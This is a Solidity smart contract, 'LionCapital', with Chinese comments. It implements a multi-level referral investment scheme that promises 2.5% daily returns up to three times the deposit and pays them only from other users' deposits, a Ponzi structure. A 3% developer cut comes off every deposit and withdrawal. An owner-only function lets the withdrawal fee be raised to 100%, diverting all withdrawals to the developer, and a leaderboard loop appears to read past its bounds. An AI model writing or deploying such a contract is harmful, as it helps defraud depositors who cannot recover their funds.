pragma solidity 0.5.10;

contract LionCapital {
    using SafeMath for uint256;

    struct User {
        uint256 cycle;                      // 用户的周期
        address upline;                     // 上级地址
        uint256 referrals;                  // 推荐人数
        uint256 payouts;                    // 已领取收益
        uint256 direct_bonus;               // 直推奖金
        uint256 pool_bonus;                 // 奖池奖金
        uint256 match_bonus;                // 匹配奖金
        uint256 deposit_amount;             // 存款金额
        uint256 deposit_payouts;            // 已领取存款收益
        uint40 deposit_time;                // 存款时间戳
        uint256 total_deposits;             // 总存款金额
        uint256 total_payouts;              // 总领取收益金额
        uint256 total_structure;            // 总团队结构
        uint256 total_downline_deposit;     // 总下线存款金额
    }
    
    address payable public owner;           // 合约所有者地址
    address payable public dev;             // 开发者地址
    
    mapping(address => User) public users;                  // 用户映射，存储用户地址和对应的用户信息
    mapping(uint256 => address) public id2Address;          // ID到地址的映射
    
    uint256[] public cycles;                 // 周期数组
    uint8[] public ref_bonuses;              // 推荐奖金比例数组
    
    uint8[] public pool_bonuses;             // 奖池奖金比例数组
    uint40 public pool_last_draw = uint40(block.timestamp);     // 上次奖池分配时间戳
    uint256 public pool_cycle;               // 奖池周期
    uint256 public pool_balance;             // 奖池余额
    uint256 public startTime;                // 合约启动时间
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;    // 奖池用户推荐人存款总额映射
    mapping(uint8 => address) public pool_top;         // 奖池排行榜
    
    uint256 public total_users = 1;           // 总用户数
    uint256 public total_deposited;           // 总存款金额
    uint256 public total_withdraw;            // 总提现金额
    
    uint256 withdrawFee = 3;                  // 提现手续费
    

    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor(uint256 _startTime, address payable _dev) public {
        owner = msg.sender;  // 设置合约所有者为合约部署者
        dev = _dev;  // 设置开发者地址为传入的地址
        startTime = _startTime;  // 设置合约启动时间为传入的时间戳
    
        // 设置推荐奖金比例数组
        ref_bonuses.push(20);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
    
        // 设置奖池奖金比例数组
        pool_bonuses.push(40);
        pool_bonuses.push(30);
        pool_bonuses.push(20);
        pool_bonuses.push(10);
    
        // 设置周期数组
        cycles.push(2e19);
        cycles.push(4e19);
        cycles.push(8e19);
        cycles.push(20e19);
    }
    
    // 默认函数，用于接收以太币
    function() payable external {
        _deposit(msg.sender, msg.value);
    }
    
    // 设置上级地址
    function _setUpline(address _addr, address _upline) private {
        // 当用户的上级地址为空、上级地址不等于自身、上级地址不等于合约所有者、上级地址的存款时间大于0或上级地址等于合约所有者时，执行以下操作
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;  // 设置用户的上级地址
            users[_upline].referrals++;  // 推荐人的推荐人数增加1
    
            emit Upline(_addr, _upline);  // 触发 Upline 事件，记录用户的上级地址变更
            id2Address[total_users] = _addr;  // 将ID与地址进行映射
            total_users++;  // 总用户数增加1
    
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;  // 如果上级地址为空，跳出循环
    
                users[_upline].total_structure++;  // 上级地址的总团队结构增加1
    
                _upline = users[_upline].upline;  // 更新上级地址为上级地址的上级地址
            }
        }
    }
    

    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");  // 要求用户的上级地址不为空，或者用户是合约所有者
    
        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;  // 如果用户已经有存款，则周期加1
    
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");  // 要求用户已领取的收益小于等于存款的最大收益
            require(_amount >= (users[_addr].deposit_amount) && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");  // 要求存款金额在有效范围内
    
        }
        else require(_amount >= 5e16 && _amount <= cycles[0], "Bad amount");  // 如果用户没有存款，则要求存款金额在有效范围内
    
        users[_addr].payouts = 0;  // 将用户的已领取收益重置为0
        users[_addr].deposit_amount = _amount;  // 设置用户的存款金额
        users[_addr].deposit_payouts = 0;  // 将用户的已领取存款收益重置为0
        users[_addr].deposit_time = uint40(block.timestamp);  // 设置用户的存款时间为当前时间戳
        users[_addr].total_deposits += _amount;  // 增加用户的总存款金额
    
        total_deposited += _amount;  // 增加合约的总存款金额
    
        emit NewDeposit(_addr, _amount);  // 触发 NewDeposit 事件，记录用户的存款操作
    
        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount.div(10);  // 给用户的直推人发放直推奖金，奖金为存款金额的 10%
    
            emit DirectPayout(users[_addr].upline, _addr, _amount.div(10));  // 触发 DirectPayout 事件，记录直推奖金发放的相关信息
        }
    
        _pollDeposits(_addr, _amount);  // 更新奖池信息
        _downLineDeposits(_addr, _amount);  // 更新下线存款信息
    
        if(pool_last_draw + 1 days < block.timestamp) {
            _drawPool();  // 如果距离上次奖池分配时间超过1天，则进行奖池分配
        }
    
        uint256 _devFee = _amount.mul(3).div(100);  // 计算开发者费用，为存款金额的 3%
        dev.transfer(_devFee);  // 将开发者费用转账给开发者地址
    }
    
    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 3 / 100;  // 将存款金额的 3% 添加到奖池余额中
    
        address upline = users[_addr].upline;  // 获取用户的上级地址
    
        if(upline == address(0)) return;  // 如果上级地址为空，则结束函数执行
    
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;  // 更新奖池用户的推荐人存款总额
    
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;  // 如果用户已经在奖池排行榜中，跳出循环
    
            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;  // 如果当前位置为空，将用户设置为该位置的上级地址
                break;
            }
    
            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }
    
                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }
    
                pool_top[i] = upline;  // 将用户设置为奖池排行榜的第 i 个位置的上级地址
    
                break;
            }
        }
    }
    

    function _downLineDeposits(address _addr, uint256 _amount) private {
        address _upline = users[_addr].upline;  // 获取用户的上级地址
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(_upline == address(0)) break;  // 如果上级地址为空，则结束循环
    
            users[_upline].total_downline_deposit = users[_upline].total_downline_deposit.add(_amount);  // 增加上级用户的下线存款总额
            _upline = users[_upline].upline;  // 更新上级地址为上级用户的上级地址
        }
    }
    
    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;  // 获取用户的上级地址
    
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;  // 如果上级地址为空，则结束循环
    
            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;  // 计算推荐奖金，为存款金额乘以对应的推荐奖金百分比
    
                users[up].match_bonus += bonus;  // 增加上级用户的匹配奖金
                emit MatchPayout(up, _addr, bonus);  // 触发 MatchPayout 事件，记录匹配奖金发放的相关信息
            }
    
            up = users[up].upline;  // 更新上级地址为上级用户的上级地址
        }
    }
    
    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);  // 更新上次奖池分配时间为当前时间戳
        pool_cycle++;  // 增加奖池周期
    
        uint256 draw_amount = pool_balance / 100;  // 计算奖池分配金额，为奖池余额的百分之一
    
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;  // 如果奖池排行榜位置为空，则结束循环
    
            uint256 win = draw_amount * pool_bonuses[i] / 100;  // 计算排行榜位置对应的奖金金额
    
            users[pool_top[i]].pool_bonus += win;  // 增加奖池排行榜位置用户的奖池奖金
            pool_balance -= win;  // 减少奖池余额
    
            emit PoolPayout(pool_top[i], win);  // 触发 PoolPayout 事件，记录奖池奖金发放的相关信息
        }
    
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);  // 清空奖池排行榜位置
        }
    }
    
    function deposit(address _upline) payable external {
        require(block.timestamp >= startTime, 'not started');  // 要求当前时间大于或等于启动时间
        _setUpline(msg.sender, _upline);  // 设置用户的上级地址
        _deposit(msg.sender, msg.value);  // 处理用户的存款操作
    }
    

    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);  // 获取用户的待支付金额和最大支付金额
    
        require(users[msg.sender].payouts < max_payout, "Full payouts");  // 要求用户的已支付金额小于最大支付金额
    
        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;  // 如果待支付金额加上已支付金额大于最大支付金额，则调整待支付金额为剩余可支付金额
            }
    
            users[msg.sender].deposit_payouts += to_payout;  // 增加用户的存款支付金额
            users[msg.sender].payouts += to_payout;  // 增加用户的已支付金额
    
            _refPayout(msg.sender, to_payout);  // 发放推荐奖金
        }
    
        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;
    
            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;  // 如果直接奖金加上已支付金额大于最大支付金额，则调整直接奖金为剩余可支付金额
            }
    
            users[msg.sender].direct_bonus -= direct_bonus;  // 减少用户的直接奖金
            users[msg.sender].payouts += direct_bonus;  // 增加用户的已支付金额
            to_payout += direct_bonus;  // 增加待支付金额
        }
    
        // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;
    
            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;  // 如果奖池奖金加上已支付金额大于最大支付金额，则调整奖池奖金为剩余可支付金额
            }
    
            users[msg.sender].pool_bonus -= pool_bonus;  // 减少用户的奖池奖金
            users[msg.sender].payouts += pool_bonus;  // 增加用户的已支付金额
            to_payout += pool_bonus;  // 增加待支付金额
        }
    
        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;
    
            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;  // 如果匹配奖金加上已支付金额大于最大支付金额，则调整匹配奖金为剩余可支付金额
            }
    
            users[msg.sender].match_bonus -= match_bonus;  // 减少用户的匹配奖金
            users[msg.sender].payouts += match_bonus;  // 增加用户的已支付金额
            to_payout += match_bonus;  // 增加待支付金额
        }
    
        require(to_payout > 0, "Zero payout");  // 要求待支付金额大于零
    
        users[msg.sender].total_payouts += to_payout;  // 增加用户的总支付金额
        total_withdraw += to_payout;  // 增加合约的总支付金额
    
        uint256 withdrawCut = to_payout.mul(withdrawFee).div(100);  // 计算提现手续费
        dev.transfer(withdrawCut);  // 将手续费转账给开发者
    
        to_payout = to_payout.sub(withdrawCut);  // 扣除提现手续费后的实际支付金额
        msg.sender.transfer(to_payout);  // 将支付金额转账给用户
    
        emit Withdraw(msg.sender, to_payout);  // 触发提现事件
    
        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);  // 如果用户的已支付金额达到最大支付金额，则触发达到限制事件
        }
    }
    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 3;  // 返回给定金额的最大支付金额（3倍于给定金额）
    }
    
    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);  // 获取用户的最大支付金额
    
        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 100) * 2500/1000 - users[_addr].deposit_payouts;  // 根据用户的存款金额和存款时间计算待支付金额
    
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;  // 如果待支付金额加上已支付金额大于最大支付金额，则调整待支付金额为剩余可支付金额
            }
        }
    }
    

    /*
        Only external call
    */
    function earned(address _addr) view external returns(uint256) {
        (uint256 to_payout, ) = this.payoutOf(_addr);  // 获取用户的待支付金额
    
        return users[_addr].direct_bonus.add(users[_addr].pool_bonus).add(users[_addr].match_bonus).add(to_payout);  // 返回用户的总收益（直接奖金、奖池奖金、匹配奖金和待支付金额之和）
    }
    
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);  // 返回用户的信息（推荐人、存款时间、存款金额、已支付金额、直接奖金、奖池奖金和匹配奖金）
    }
    
    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure, uint256 total_downline_deposit) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure, users[_addr].total_downline_deposit);  // 返回用户的统计信息（推荐人数、总存款金额、总支付金额、总结构和总下线存款金额）
    }
    
    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);  // 返回合约的信息（总用户数、总存款金额、总提现金额、奖池最后抽奖时间、奖池余额和奖池领先者的下线存款金额）
    }
    
    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;
    
            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];  // 返回奖池的前四名用户信息（地址和下线存款金额）
        }
    }
    
    function updateWithdrawFee(uint256 _newFee) public returns(bool) {
        require(msg.sender == owner, "unauthorized call");  // 要求调用者为合约所有者
        require(3 <= _newFee && _newFee <= 100, "invalidTime");  // 要求提供的新手续费在3到100之间
        withdrawFee = _newFee;  // 更新提现手续费
        return true;
    }
    
    function updateStarttime(uint256 _startTime) public returns(bool) {
        require(msg.sender == owner, "unauthorized call");  // 要求调用者为合约所有者
        require(startTime < _startTime, "invalidTime");  // 要求提供的新开始时间晚于当前开始时间
        startTime = _startTime;  // 更新开始时间
        return true;
    }
    

}

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}